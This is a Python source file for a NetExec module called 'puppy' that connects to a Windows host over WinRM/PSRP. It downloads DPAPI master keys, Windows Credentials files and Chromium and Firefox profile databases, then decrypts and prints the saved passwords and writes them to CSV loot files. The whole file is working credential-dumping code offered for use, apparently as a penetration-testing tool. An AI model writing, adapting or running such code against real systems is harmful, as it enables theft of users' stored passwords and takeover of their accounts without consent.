import os
import re
import csv
import json
import base64
import sqlite3
import tempfile

from pathlib import Path
from binascii import unhexlify
from Cryptodome.Cipher import DES3
from pyasn1.codec.der import decoder
from dploot.triage.browser import BrowserTriage
from dploot.lib.target import Target
from dploot.lib.masterkey import Masterkey as DPMasterkey
from impacket.uuid import bin_to_string
from impacket.dpapi import MasterKeyFile, MasterKey, deriveKeysFromUser, DPAPI_BLOB, CredentialFile, CREDENTIAL_BLOB
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    DPAPI and browsers dumper over WinRM/PSRP.
    Grab DPAPI (Windows Credentials) и credentials from Chromium/Firefox from a non-privileged user if they have winrm access.

    Module by @Chillov3k
    """

    name = "puppy"
    description = "DPAPI and browsers dumper working over WINRM and PSRP"
    supported_protocols = ["winrm"]
    category = CATEGORY.CREDENTIAL_DUMPING

    # ======================== options ========================
    def options(self, context, module_options):
        """
        REMOTE=PATH     Optional. If omitted, module auto-discovers user data paths under %APPDATA%.
        DST=DIR         Local base directory to store loot (default: ~/.nxc/loot/<HOST>/<USER>)
        RECURSE=true    Recurse into subdirectories when listing (default: false)
        MP=password     Firefox master password (optional; default: try empty and current user's password)
        """
        self.remote = module_options.get("REMOTE")
        self.dst = module_options.get("DST")
        self.recurse = str(module_options.get("RECURSE", "false")).lower() in ("1", "true", "yes", "y")
        self.ff_master_password = (module_options.get("MP") or "").strip()

    # ======================== small helpers ========================
    def _win_norm(self, p: str) -> str:
        return str(p).replace("\\", "/")

    def _win_basename(self, p: str) -> str:
        return self._win_norm(p).rstrip("/").split("/")[-1]

    def _win_parentname(self, p: str) -> str:
        n = self._win_norm(p).rstrip("/")
        parts = n.split("/")
        return parts[-1] if parts else "root"

    def _safe_name(self, s: str) -> str:
        return re.sub(r"[^A-Za-z0-9._-]+", "_", s)

    def _fmt_secret_line(self, winuser: str, source: str, target: str, username: str, secret: str) -> str:
        tgt = target if (target and target.strip()) else "-"
        return f"[{winuser}][{source}] {tgt} - {username}:{secret}"

    # ======================== PSRP helpers ========================
    def _psrp_open(self, host, domain, username, password, port=5985, use_https=False):
        from pypsrp.wsman import WSMan

        scheme = "https" if use_https else "http"
        upn = f"{domain}\\{username}" if domain else username
        return WSMan(
            server=host,
            port=port,
            path="wsman",
            username=upn,
            password=password,
            auth="ntlm",
            encryption="always",
            scheme=scheme,
            ssl=False,
            cert_validation=False,
        )

    def _ps_invoke(self, pool, script, params=None):
        from pypsrp.powershell import PowerShell

        ps = PowerShell(runspace_pool=pool)
        ps.add_script(script)
        if params:
            for k, v in params.items():
                ps.add_parameter(k, v)
        out = ps.invoke()
        if ps.had_errors:
            raise RuntimeError("; ".join(str(e) for e in ps.streams.error))
        return out

    # ======================== dploot WinRM adapter ========================
    class _FakeSharedEntry:
        def __init__(self, name: str, is_dir: bool):
            self._name = name
            self._is_dir = is_dir

        def is_directory(self) -> int:
            return 1 if self._is_dir else 0

        def get_longname(self) -> str:
            return self._name

    class DPLootWinRMConnection:
        def __init__(self, mod_self, pool):
            self._mod = mod_self
            self.pool = pool
            try:
                from dploot.lib.consts import FALSE_POSITIVES

                self.false_positive = set(FALSE_POSITIVES)
            except Exception:
                self.false_positive = {".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users"}

        def list_users(self, share: str):
            """Get users from remote host via C:/Users"""
            script = r"""
            $ErrorActionPreference="SilentlyContinue"
            Get-ChildItem -LiteralPath 'C:\Users' -Force -Directory | Select-Object -ExpandProperty Name
            """

            out = self._mod._ps_invoke(self.pool, script)
            names = [str(x).strip() for x in out if str(x).strip()]
            return [n for n in names if n not in self.false_positive]

        def remote_list_dir(self, share, path, wildcard=True):
            """Enumeration of directory C:/"""
            script = r"""
            param([string]$Rel,[bool]$Wildcard=$true)
            $ErrorActionPreference="SilentlyContinue"
            $base = "C:\"
            $full = Join-Path -Path $base -ChildPath $Rel
            if ($Wildcard) { $full = Join-Path -Path $full -ChildPath "*" }
            if (-not (Test-Path -LiteralPath $full)) { return @() }
            Get-ChildItem -LiteralPath $full -Force -ErrorAction SilentlyContinue |
            ForEach-Object { if ($_.PSIsContainer) { "D|$($_.Name)" } else { "F|$($_.Name)" } }
            """

            try:
                out = self._mod._ps_invoke(self.pool, script, {"Rel": str(path).replace("/", "\\"), "Wildcard": bool(wildcard)})
            except Exception:
                return None
            entries = []
            for line in out:
                s = str(line).strip()
                if not s:
                    continue
                kind, name = ([*s.split("|", 1), ""])[:2]
                is_dir = kind == "D"
                entries.append(NXCModule._FakeSharedEntry(name=name, is_dir=is_dir))
            return entries

        def readFile(self, shareName, path, mode=None, offset=0, **_):
            full = f"C:\\{str(path).replace('/', '\\').lstrip('\\')}"
            return self._mod._read_remote_bytes(self.pool, full, offset=offset, soft_missing=True)

        def is_admin(self):
            return False

        def enable_remoteops(self):
            return

        def reconnect(self):
            return True

    # ======================== discovery & IO ========================

    PS_READ_BYTES = r"""
    param([string]$Path,[int]$Chunk=1048576,[int]$Offset=0,[bool]$SoftMissing=$true)
    if (-not (Test-Path -LiteralPath $Path)) { if ($SoftMissing) { return @() } else { throw "File not found: $Path" } }
    $fs=$null
    try{
    try{$fs=[System.IO.FileStream]::new($Path,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete)}
    catch{$fs=[System.IO.File]::OpenRead($Path)}
    if($Offset -gt 0){$fs.Seek($Offset,[System.IO.SeekOrigin]::Begin)|Out-Null}
    $buf=New-Object byte[] $Chunk
    while(($read=$fs.Read($buf,0,$buf.Length)) -gt 0){
        if($read -eq $buf.Length){[Convert]::ToBase64String($buf)}
        else{[Convert]::ToBase64String($buf,0,$read)}
    }
    }finally{ if($fs){$fs.Dispose()} }
    """

    def _read_remote_bytes(self, pool, abs_path: str, chunk=1024 * 1024, offset=0, soft_missing=True, PS_READ_BYTES=PS_READ_BYTES) -> bytes:
        chunks = self._ps_invoke(pool, PS_READ_BYTES, {"Path": abs_path, "Chunk": int(chunk), "Offset": int(offset), "SoftMissing": bool(soft_missing)})
        return b"".join(base64.b64decode(str(b)) for b in chunks if b)

    def _discover_user_env(self, pool):
        """Getting SID, user, %APPDATA% dir and hostname"""
        script = r"""
        $ErrorActionPreference="Stop"
        $sid = (whoami /user | Select-String -Pattern 'S-\d-\d+-(\d+-){1,}\d+$').Matches.Value
        [PSCustomObject]@{
        SID   = $sid
        APP   = $env:APPDATA
        USER  = (whoami)
        HOST  = $env:COMPUTERNAME
        } | ConvertTo-Json -Compress
        """

        raw = self._ps_invoke(pool, script)
        js = str(raw[0]) if raw else "{}"
        try:
            import json as _json

            return _json.loads(js)
        except Exception:
            return {}

    def _enumerate_files(self, pool, remote_path, recurse=False) -> list[str]:
        """
        If object is dir return files from there
        If the object is a file, it returns the file unchanged
        """
        script = r"""
        param([string]$Path,[bool]$Recurse=$false)
        if (-not (Test-Path -LiteralPath $Path)) { return @() }
        $item = Get-Item -LiteralPath $Path -Force
        if ($item.PSIsContainer) {
            $opt = @{}; if ($Recurse) { $opt.Recurse = $true }
            Get-ChildItem -LiteralPath $Path -File -Force @opt | ForEach-Object { $_.FullName }
        } else { $item.FullName }
        """

        out = self._ps_invoke(pool, script, {"Path": remote_path, "Recurse": recurse})
        return [str(x) for x in out]

    def _download_one(self, pool, remote_file, local_file, chunk_bytes=1024 * 1024) -> bool:
        """Downloading remote files"""
        data = self._read_remote_bytes(pool, remote_file, chunk=chunk_bytes, soft_missing=False)
        Path(local_file).parent.mkdir(parents=True, exist_ok=True)
        Path(local_file).write_bytes(data)
        return True

    # ======================== Chromium minimal enumeration (без cookies) ========================
    def _chromium_minimal_targets(self, pool) -> list[str]:
        """Retrieves the list of absolute paths to Chromium browser files"""
        script = r"""
        $ErrorActionPreference="Stop"
        $roots = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Chromium\User Data"
        ) | Where-Object { Test-Path -LiteralPath $_ }

        $profiles = @("Default")
        foreach ($r in $roots) {
        Get-ChildItem -LiteralPath $r -Directory -Force -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match '^Profile \d+$' } |
            ForEach-Object { $profiles += $_.Name }
        }

        function WantSet($p) {
        return @(
            "Local State",
            "$p\Login Data","$p\Login Data-wal","$p\Login Data-journal",
            "$p\Web Data","$p\Web Data-wal","$p\Web Data-journal",
            "$p\History","$p\History-wal","$p\History-journal"
        )
        }

        $targets = New-Object System.Collections.ArrayList
        foreach ($root in $roots) {
        foreach ($p in $profiles) {
            foreach ($rel in (WantSet $p)) {
            $full = Join-Path $root $rel
            if (Test-Path -LiteralPath $full) { [void]$targets.Add($full) }
            }
        }
        }

        $targets | ConvertTo-Json -Compress
        """

        out = self._ps_invoke(pool, script)
        try:
            return json.loads(str(out[0])) if out else []
        except Exception:
            return []

    # ======================== dploot masterkeys ========================
    def _build_dploot_masterkeys(self, context, base_dst: Path, sid: str, password: str):
        protect_dir = base_dst / self._safe_name(sid)
        if not protect_dir.exists():
            context.log.display(f"[puppy] no Protect dir at {protect_dir}, skip building dploot masterkeys")
            return []

        mkeys = []
        seen = set()
        for mk_path in protect_dir.iterdir():
            if not mk_path.is_file():
                continue
            fname = mk_path.name
            base_name = re.sub(r"\(\d+\)$", "", Path(fname).stem)
            if base_name.lower().startswith("preferred"):
                continue
            if base_name in seen:
                continue
            seen.add(base_name)

            try:
                raw = mk_path.read_bytes()
                mkf = MasterKeyFile(raw)
                offset = len(mkf)
                mk_len = int(mkf["MasterKeyLen"])
                if mk_len <= 0 or offset + mk_len > len(raw):
                    continue
                mk_data = raw[offset : offset + mk_len]
                mk = MasterKey(mk_data)
                ok = False
                for user_key in deriveKeysFromUser(sid, password):
                    if mk.decrypt(user_key) is not None:
                        ok = True
                        break
                if not ok:
                    continue
                guid_raw = mkf["Guid"]
                guid = (guid_raw.decode("utf-16le", errors="ignore") if isinstance(guid_raw, bytes) else str(guid_raw)).strip("{}").lower()
                mkeys.append(DPMasterkey(guid=guid, key=mk.decryptedKey, user="local"))
            except Exception as e:
                context.log.debug(f"[puppy] failed parsing masterkey {mk_path}: {e}")

        return mkeys

    # ======================== dploot triage wrapper (Chromium creds) ========================
    def _triage_browsers_via_dploot(self, context, pool, base_dst: Path, connection, masterkeys: list, lines_out: list[str]) -> int:
        tgt = Target.create(
            domain=getattr(connection, "domain", "") or "",
            username=getattr(connection, "username", "") or "",
            password=getattr(connection, "password", "") or "",
            target=getattr(connection, "host", "") or "LOCAL",
            no_pass=True,
        )

        conn = self.DPLootWinRMConnection(self, pool)

        def _norm_browser(name: str) -> str:
            s = (name or "").strip().lower()
            if "edge" in s:
                return "MICROSOFT EDGE"
            if "brave" in s:
                return "BRAVE"
            if "chromium" in s:
                return "CHROMIUM"
            if "chrome" in s:
                return "GOOGLE CHROME"
            return s.upper() if s else "BROWSER"

        collected = []

        def _cb(secret_obj):
            try:
                winuser = getattr(secret_obj, "winuser", "") or ""
                browser = _norm_browser(getattr(secret_obj, "browser", ""))
                url = getattr(secret_obj, "url", "") or ""
                username = getattr(secret_obj, "username", "") or ""
                password = getattr(secret_obj, "password", "") or ""
                lines_out.append(self._fmt_secret_line(winuser, browser, url, username, password))
                collected.append(1)
            except Exception:
                pass

        triage = BrowserTriage(
            target=tgt,
            conn=conn,
            masterkeys=masterkeys,
            per_secret_callback=_cb,
        )

        creds = triage.triage_browsers(bypass_shared_violation=True)
        try:
            out_dir = base_dst / "browsers"
            out_dir.mkdir(parents=True, exist_ok=True)
            cred_csv = out_dir / "logins.csv"
            with cred_csv.open("w", encoding="utf-8", newline="") as fw:
                w = csv.writer(fw)
                w.writerow(["winuser", "browser", "url", "username", "password"])
                for c in creds:
                    w.writerow([
                        getattr(c, "winuser", ""),
                        getattr(c, "browser", ""),
                        getattr(c, "url", ""),
                        getattr(c, "username", ""),
                        getattr(c, "password", ""),
                    ])
        except Exception as e:
            context.log.fail(f"[puppy] failed writing logins.csv: {e}")

        return len(collected)

    # ======================== Firefox triage ========================
    def _ff_parse_profiles_ini(self, raw_bytes: bytes) -> list[str]:
        """Разбор profiles.ini -> список относительных путей профилей."""
        text = raw_bytes.decode("utf-8", "ignore").splitlines()
        curr = {}
        profiles = []
        for line in text:
            line = line.strip()
            if not line or line.startswith((";", "#")):
                continue
            if line.startswith("[") and line.endswith("]"):
                if curr:
                    p = curr.get("Path")
                    if p:
                        profiles.append(p)
                curr = {}
                continue
            if "=" in line:
                k, v = line.split("=", 1)
                curr[k.strip()] = v.strip()
        if curr.get("Path"):
            profiles.append(curr["Path"])
        return profiles

    def _ff_decode_login_data(self, data_b64: str) -> tuple[bytes, bytes, bytes]:
        from base64 import b64decode
        from pyasn1.codec.der import decoder

        asn1data = decoder.decode(b64decode(data_b64))
        return (
            asn1data[0][0].asOctets(),
            asn1data[0][1][1].asOctets(),
            asn1data[0][2].asOctets(),
        )

    def _ff_decrypt_3des_pbes(self, decoded_item, master_password: bytes, global_salt: bytes) -> bytes:
        import hmac
        from hashlib import sha1, pbkdf2_hmac
        from Cryptodome.Cipher import DES3, AES

        pbeAlgo = str(decoded_item[0][0][0])
        if pbeAlgo == "1.2.840.113549.1.12.5.1.3":
            entry_salt = decoded_item[0][0][1][0].asOctets()
            cipher_t = decoded_item[0][1].asOctets()
            hp = sha1(global_salt + master_password).digest()
            pes = entry_salt + b"\x00" * (20 - len(entry_salt))
            chp = sha1(hp + entry_salt).digest()
            k1 = hmac.new(chp, pes + entry_salt, sha1).digest()
            tk = hmac.new(chp, pes, sha1).digest()
            k2 = hmac.new(chp, tk + entry_salt, sha1).digest()
            k = k1 + k2
            iv = k[-8:]
            key = k[:24]
            return DES3.new(key=key, mode=DES3.MODE_CBC, iv=iv).decrypt(cipher_t)
        elif pbeAlgo == "1.2.840.113549.1.5.13":
            assert str(decoded_item[0][0][1][0][0]) == "1.2.840.113549.1.5.12"
            assert str(decoded_item[0][0][1][0][1][3][0]) == "1.2.840.113549.2.9"
            assert str(decoded_item[0][0][1][1][0]) == "2.16.840.1.101.3.4.1.42"
            entry_salt = decoded_item[0][0][1][0][1][0].asOctets()
            iteration_count = int(decoded_item[0][0][1][0][1][1])
            key_length = int(decoded_item[0][0][1][0][1][2])
            assert key_length == 32
            k0 = sha1(global_salt + master_password).digest()
            aes_key = pbkdf2_hmac("sha256", k0, entry_salt, iteration_count, dklen=key_length)
            iv = b"\x04\x0e" + decoded_item[0][0][1][1][1].asOctets()
            enc = decoded_item[0][1].asOctets()
            return AES.new(aes_key, AES.MODE_CBC, iv).decrypt(enc)
        else:
            return b""

    def _ff_get_key_from_key4(self, key4_data: bytes, mp_candidates: list[bytes], context) -> bytes | None:
        fh = tempfile.NamedTemporaryFile(delete=False)
        db = None
        try:
            fh.write(key4_data)
            fh.flush()
            fh.seek(0)
            db = sqlite3.connect(fh.name)
            cur = db.cursor()
            cur.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
            row = cur.fetchone()
            if not row:
                context.log.debug("firefox: no metadata/password row")
                return None

            global_salt = row[0]
            item2 = row[1]
            ok = False
            mp_ok = b""
            for mp in mp_candidates:
                try:
                    decoded_item2 = decoder.decode(item2)
                    clear = self._ff_decrypt_3des_pbes(decoded_item2, mp, global_salt)
                    if clear == b"password-check\x02\x02":
                        ok = True
                        mp_ok = mp
                        break
                except Exception as e:
                    context.log.debug(f"firefox MP check err: {e}")
            if not ok:
                return None

            try:
                cur.execute("SELECT a11,a102 FROM nssPrivate;")
                rows = cur.fetchall()
                for a11, a102 in rows:
                    if not a11:
                        continue
                    if a102 == unhexlify("f8000000000000000000000000000001"):
                        decoded_a11 = decoder.decode(a11)
                        key_blob = self._ff_decrypt_3des_pbes(decoded_a11, mp_ok, global_salt)
                        if key_blob:
                            return key_blob[:24]
            except Exception as e:
                context.log.debug(f"firefox nssPrivate read fail: {e}")
                return None
            return None
        except Exception as e:
            context.log.debug(f"firefox key4 open error: {e}")
            return None
        finally:
            try:
                db and db.close()
            except Exception:
                pass
            try:
                fh.close()
                os.remove(fh.name)
            except Exception:
                pass

    def _ff_decrypt_value_3des(self, key: bytes, iv: bytes, ciphertext: bytes) -> bytes:
        data = DES3.new(key=key, mode=DES3.MODE_CBC, iv=iv).decrypt(ciphertext)
        pad = data[-1]
        try:
            return data[:-pad]
        except Exception:
            return data

    def _firefox_triage_winrm(self, context, pool, base_dst: Path, connection, lines_out: list[str]) -> int:
        conn = self.DPLootWinRMConnection(self, pool)
        users = conn.list_users("C$") or []
        users = [u for u in users if u not in getattr(conn, "false_positive", set())]
        if not users:
            return 0

        out_root = base_dst / "firefox"
        out_root.mkdir(parents=True, exist_ok=True)

        mp_candidates = [b""]
        if self.ff_master_password:
            mp_candidates.append(self.ff_master_password.encode("utf-8", "ignore"))
        win_pw = getattr(connection, "password", "") or ""
        if win_pw:
            mp_candidates.append(win_pw.encode("utf-8", "ignore"))
        seen = set()
        uniq = []
        for x in mp_candidates:
            k = ("x", x)
            if k not in seen:
                seen.add(k)
                uniq.append(x)
        mp_candidates = uniq

        ff_logins_csv = out_root / "logins.csv"
        if not ff_logins_csv.exists():
            with ff_logins_csv.open("w", encoding="utf-8", newline="") as fw:
                w = csv.writer(fw)
                w.writerow(["winuser", "profile", "url", "username", "password"])

        found = 0
        for user in users:
            ini_rel = f"Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\profiles.ini"
            ini_bytes = None
            try:
                ini_bytes = conn.readFile("C$", ini_rel, bypass_shared_violation=True)
            except Exception as e:
                context.log.debug(f"[puppy] firefox: read profiles.ini fail for {user}: {e}")
            profile_dirs = set()
            if ini_bytes:
                try:
                    paths = self._ff_parse_profiles_ini(ini_bytes)
                    for p in paths:
                        if re.match(r"^[A-Za-z]:\\", p):
                            rel = p.split(":", 1)[1].lstrip("\\/")
                            profile_dirs.add(rel)
                        else:
                            profile_dirs.add(f"Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\{p}")
                except Exception as e:
                    context.log.debug(f"[puppy] firefox: parse profiles.ini error for {user}: {e}")

            profiles_dir = f"Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
            try:
                entries = conn.remote_list_dir("C$", profiles_dir, wildcard=True) or []
                for ent in entries:
                    if ent.is_directory() and ent.get_longname():
                        profile_dirs.add(f"{profiles_dir}\\{ent.get_longname()}")
            except Exception as e:
                context.log.debug(f"[puppy] firefox: list Profiles fail for {user}: {e}")

            if not profile_dirs:
                continue

            for prof_rel in sorted(profile_dirs):
                prof_name = prof_rel.split("\\")[-1]
                prof_out = out_root / self._safe_name(prof_name)
                prof_out.mkdir(parents=True, exist_ok=True)
                p_key4 = f"{prof_rel}\\key4.db"
                p_logins = f"{prof_rel}\\logins.json"
                extras = [f"{prof_rel}\\places.sqlite", f"{prof_rel}\\formhistory.sqlite"]

                def _save_if_exists(remote_path: str, local_name: str) -> bytes | None:
                    try:
                        data = conn.readFile("C$", remote_path, bypass_shared_violation=True)
                        if data:
                            (prof_out / local_name).write_bytes(data)
                            return data
                    except Exception as e:
                        context.log.debug(f"[puppy] firefox read fail {remote_path}: {e}")
                    return None

                key4_bytes = _save_if_exists(p_key4, "key4.db")
                logins_bytes = _save_if_exists(p_logins, "logins.json")
                for ex in extras:
                    _save_if_exists(ex, self._safe_name(self._win_basename(ex)))

                if not key4_bytes or not logins_bytes:
                    continue

                try:
                    key24 = self._ff_get_key_from_key4(key4_bytes, mp_candidates, context)
                    if not key24:
                        continue

                    js = json.loads(logins_bytes.decode("utf-8", "ignore"))
                    logins = js.get("logins") or []
                    if not logins:
                        continue

                    with ff_logins_csv.open("a", encoding="utf-8", newline="") as fw:
                        w = csv.writer(fw)
                        for row in logins:
                            try:
                                u_iv, u_ct = self._ff_decode_login_data(row.get("encryptedUsername", ""))[1:]
                                p_iv, p_ct = self._ff_decode_login_data(row.get("encryptedPassword", ""))[1:]
                                dec_u = self._ff_decrypt_value_3des(key24, u_iv, u_ct).decode("utf-8", "ignore")
                                dec_p = self._ff_decrypt_value_3des(key24, p_iv, p_ct).decode("utf-8", "ignore")
                                url = row.get("hostname", "") or row.get("formSubmitURL", "") or ""
                                w.writerow([user, prof_name, url, dec_u, dec_p])
                                lines_out.append(self._fmt_secret_line(user, "FIREFOX", url, dec_u, dec_p))
                                found += 1
                            except Exception as e:
                                context.log.debug(f"[puppy] firefox login decrypt error ({prof_rel}): {e}")
                except Exception:
                    pass
        return found

    # ======================== DPAPI decrypt of Credentials ========================
    def _decrypt_dpapi_files(self, context, base_dst: Path, sid: str, password: str, username: str) -> tuple[list[str], int, int]:
        def _norm_guid_str(g):
            if isinstance(g, bytes):
                g = g.decode("utf-16le", errors="ignore")
            g = (g or "").strip().lower()
            if g.startswith("{") and g.endswith("}"):
                g = g[1:-1]
            return g

        def _is_guid_filename(name):
            return re.fullmatch(r"[0-9a-fA-F]{8}(?:-[0-9a-fA-F]{4}){3}-[0-9a-fA-F]{12}", name) is not None

        protect_dir = base_dst / self._safe_name(sid)
        master_keys = {}
        if protect_dir.exists():
            seen = set()
            for mk_path in protect_dir.iterdir():
                if not mk_path.is_file():
                    continue
                fname = mk_path.name
                if fname.lower().startswith("preferred"):
                    continue
                if not _is_guid_filename(fname.split("(")[0]):
                    continue
                base_name = re.sub(r"\(\d+\)$", "", Path(fname).stem)
                if base_name in seen:
                    continue
                seen.add(base_name)

                try:
                    raw = mk_path.read_bytes()
                    mkf = MasterKeyFile(raw)
                    offset = len(mkf)
                    mk_len = int(mkf["MasterKeyLen"])
                    if mk_len <= 0 or offset + mk_len > len(raw):
                        continue
                    mk_data = raw[offset : offset + mk_len]
                    mk = MasterKey(mk_data)
                    for user_key in deriveKeysFromUser(sid, password):
                        if mk.decrypt(user_key) is not None:
                            guid_str = _norm_guid_str(mkf["Guid"])
                            master_keys[guid_str] = mk.decryptedKey
                            break
                except Exception as e:
                    context.log.debug(f"[puppy] Error processing masterkey {mk_path}: {e}")

        lines = []
        decrypted_count = 0
        cred_dir = base_dst / "Credentials"
        if cred_dir.exists() and master_keys:
            for cf in cred_dir.iterdir():
                if not cf.is_file():
                    continue
                if cf.name.endswith(".decrypted"):
                    continue
                try:
                    data = cf.read_bytes()
                    try:
                        cf_obj = CredentialFile(data)
                        blob_data = cf_obj["Data"]
                    except Exception:
                        blob_data = data
                    blob = DPAPI_BLOB(blob_data)
                    blob_guid = bin_to_string(blob["GuidMasterKey"]).lower()

                    if blob_guid not in master_keys:
                        continue

                    clear = blob.decrypt(master_keys[blob_guid])
                    if not clear:
                        continue

                    out_file = cf.with_suffix(".decrypted")
                    if not out_file.exists():
                        out_file.write_bytes(clear)

                    try:
                        cblob = CREDENTIAL_BLOB(clear)

                        def _u16(b: bytes) -> str:
                            if not b:
                                return ""
                            try:
                                return b.decode("utf-16le", errors="ignore")
                            except Exception:
                                return ""

                        def _best_str(b: bytes) -> str:
                            if not b:
                                return ""
                            if len(b) % 2 == 0:
                                try:
                                    s = b.decode("utf-16le")
                                    if any(ch.isprintable() for ch in s):
                                        return s
                                except Exception:
                                    pass
                            for enc in ("utf-8", "latin-1"):
                                try:
                                    s = b.decode(enc)
                                    if any(ch.isprintable() for ch in s):
                                        return s
                                except Exception:
                                    continue
                            return ""

                        tgt = _u16(cblob["Target"])
                        user_in_blob = _u16(cblob["Username"])
                        pwd_txt = _best_str(cblob["Unknown3"]) or f"hex[{len(cblob['Unknown3'])} bytes]"
                        lines.append(self._fmt_secret_line(username, "CREDENTIAL", tgt, user_in_blob, pwd_txt))
                        decrypted_count += 1
                    except Exception:
                        pass
                except Exception as e:
                    context.log.debug(f"[puppy] Error processing credential {cf}: {e}")

        return lines, len(master_keys), decrypted_count

    def on_login(self, context, connection):
        try:
            p = getattr(connection, "port", 5985)
            if isinstance(p, (list, tuple)) and p:
                p = p[0]
            context.log.extra["port"] = str(p)
        except Exception:
            context.log.extra["port"] = "5985"

        lines_dpapi: list[str] = []
        lines_chromium: list[str] = []
        lines_firefox: list[str] = []

        context.log.highlight("[puppy] auto-discovery mode starting")

        user_name = getattr(connection, "username", "user")
        host_name = getattr(connection, "hostname", None) or getattr(connection, "host", "host")
        base_dst = Path(self.dst) if self.dst else Path("~/.nxc/loot") / host_name / user_name
        base_dst = base_dst.expanduser().absolute()
        base_dst.mkdir(parents=True, exist_ok=True)

        """
        Connecting to PSRP
        """

        try:
            wsman = self._psrp_open(
                host=connection.host,
                domain=getattr(connection, "domain", "") or "",
                username=connection.username,
                password=getattr(connection, "password", "") or "",
                port=5985,
                use_https=False,
            )
            from pypsrp.powershell import RunspacePool

            pool = RunspacePool(wsman)
            pool.open()
        except Exception as e:
            context.log.fail(f"[puppy] PSRP connect failed: {e}")
            return

        try:
            envinfo = self._discover_user_env(pool)
            sid = envinfo.get("SID", "")
            app = envinfo.get("APP", "")
            context.log.highlight(f"[puppy] detected APPDATA: {app}")
            context.log.highlight(f"[puppy] detected SID: {sid}")
            try:
                (base_dst / "sid.txt").write_text((sid or "").strip() + "\n", encoding="utf-8")
            except Exception:
                pass

            remote_sets = []
            if self.remote:
                remote_sets = [self.remote]
            else:
                if app:
                    cred_dir = str(Path(app) / "Microsoft" / "Credentials")
                    prot_dir = str(Path(app) / "Microsoft" / "Protect" / (sid or ""))
                    remote_sets = [cred_dir, prot_dir]

            total_files = 0
            total_saved = 0
            for rp in remote_sets:
                try:
                    files = self._enumerate_files(pool, rp, self.recurse)
                except Exception as e:
                    context.log.fail(f"[puppy] enumerate failed for {rp}: {e}")
                    continue

                if not files:
                    context.log.display(f"[puppy] no files under: {rp}")
                    continue

                total_files += len(files)
                parent_name = self._safe_name(self._win_parentname(rp) or "root")
                dst_dir = base_dst / parent_name
                dst_dir.mkdir(parents=True, exist_ok=True)

                for rf in files:
                    try:
                        fname = self._safe_name(self._win_basename(rf))
                        lf = dst_dir / fname
                        if lf.exists():
                            continue
                        self._download_one(pool, rf, str(lf))
                        total_saved += 1
                    except Exception as e:
                        context.log.fail(f"[puppy] failed: {rf}: {e}")

            if total_files == 0:
                context.log.highlight("[puppy] nothing to save under auto-discovered paths")
            else:
                context.log.highlight(f"[puppy] done. {total_saved}/{total_files} file(s) saved under {base_dst}")

            password = getattr(connection, "password", "") or ""
            if password and sid:
                context.log.highlight("[*] Collecting DPAPI masterkeys, grab a coffee and be patient...")
                lines, mk_count, dec_count = self._decrypt_dpapi_files(context, base_dst, sid, password, user_name)
                context.log.success(f"[+] Got {mk_count} decrypted masterkeys. Looting secrets...")
                lines_dpapi.extend(lines)
            else:
                context.log.display("[puppy] Skipping DPAPI decryption (need SID + password)")

            try:
                chromium_files = self._chromium_minimal_targets(pool)
                if chromium_files:
                    context.log.highlight(f"[puppy] chromium minimal: {len(chromium_files)} file(s) to fetch")
                    dst_dir = base_dst / "chromium"
                    for rf in chromium_files:
                        try:
                            m = re.search(r"(Google\\Chrome|Microsoft\\Edge|BraveSoftware\\Brave-Browser|Chromium)\\User Data[\\/](.*)$", rf, flags=re.IGNORECASE)
                            if m:
                                rel = f"{m.group(1)}\\User Data\\{m.group(2)}"
                            else:
                                m2 = re.search(r"User Data[\\/](.*)$", rf, flags=re.IGNORECASE)
                                rel = f"UnknownVendor\\User Data\\{m2.group(1)}" if m2 else self._win_basename(rf)
                            rel = rel.replace("\\", "/")
                            out_path = dst_dir / self._safe_name(rel).replace("__", "_")
                            if out_path.exists():
                                continue
                            out_path.parent.mkdir(parents=True, exist_ok=True)
                            self._download_one(pool, rf, str(out_path))
                        except Exception:
                            pass
                else:
                    context.log.display("[puppy] chromium minimal: nothing found")
            except Exception as e:
                context.log.fail(f"[puppy] chromium enumeration failed: {e}")

            try:
                dploot_mks = []
                if password and sid:
                    dploot_mks = self._build_dploot_masterkeys(context, base_dst, sid, password)
                _ = self._triage_browsers_via_dploot(
                    context=context,
                    pool=pool,
                    base_dst=base_dst,
                    connection=connection,
                    masterkeys=dploot_mks,
                    lines_out=lines_chromium,
                )
            except Exception as e:
                context.log.fail(f"[puppy] dploot BrowserTriage failed: {e}")

            try:
                _ = self._firefox_triage_winrm(context, pool, base_dst, connection, lines_firefox)
            except Exception as e:
                context.log.fail(f"[puppy] firefox triage failed: {e}")

            context.log.highlight("[*] DPAPI credentials")
            for line in lines_dpapi:
                context.log.highlight(line)
            context.log.display(f"Found {len(lines_dpapi)} items.")

            context.log.highlight("[*] Chromium (Chrome/Edge/Brave)")
            for line in lines_chromium:
                context.log.highlight(line)
            context.log.display(f"Found {len(lines_chromium)} items.")

            context.log.highlight("[*] Firefox")
            for line in lines_firefox:
                context.log.highlight(line)
            context.log.display(f"Found {len(lines_firefox)} items.")

        finally:
            try:
                context.log.success(f"All collected files saved to -> {base_dst}")
                pool.close()
            except Exception:
                pass
